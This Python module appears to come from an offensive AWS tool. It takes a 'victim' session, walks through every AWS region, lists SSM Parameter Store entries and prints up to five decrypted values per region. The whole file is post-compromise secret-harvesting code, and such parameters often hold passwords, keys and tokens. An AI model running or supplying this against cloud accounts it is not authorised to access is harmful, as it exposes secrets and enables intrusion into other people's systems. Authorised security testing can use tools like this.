from colorama import Fore
import json
from modules.utils import custom_serializer
import modules.globals as my_globals
from modules.logger import *

def ssm_init_enum(victim_session, attacker_session):
    enable_print_logging()
    list_ssm_parameters(victim_session)

def list_ssm_parameters(victim_session):
    print(f"{Fore.GREEN}[+] Enumerating SSM Parameters:")
    for region in my_globals.aws_regions:
        try:
            ssm_client = victim_session.client("ssm", region_name=region)
            params = ssm_client.describe_parameters().get("Parameters", [])
            for param in params[:5]:
                print(f"{Fore.MAGENTA} | Region: {region} | SSM Parameter: {param['Name']}")
                try:
                    value = ssm_client.get_parameter(Name=param['Name'], WithDecryption=True).get("Parameter", {})
                    print(f"{Fore.YELLOW}{json.dumps(value, indent=4, sort_keys=True, default=custom_serializer)}")
                except Exception as e:
                    print(f"{Fore.LIGHTBLACK_EX} | Failed to get value for parameter: {param['Name']}")
                    log_error(f"Failed to get value for parameter: {param['Name']}\n | Error: {e}")
        except KeyboardInterrupt:
            raise
        except Exception as e:
            sys.stderr.write("\r\033[K")
            sys.stderr.write(f"{Fore.LIGHTBLACK_EX} | Failed to list SSM parameters in region {region}")
            sys.stderr.flush()
            log_error(f"\n | Error:{e}")
    print("")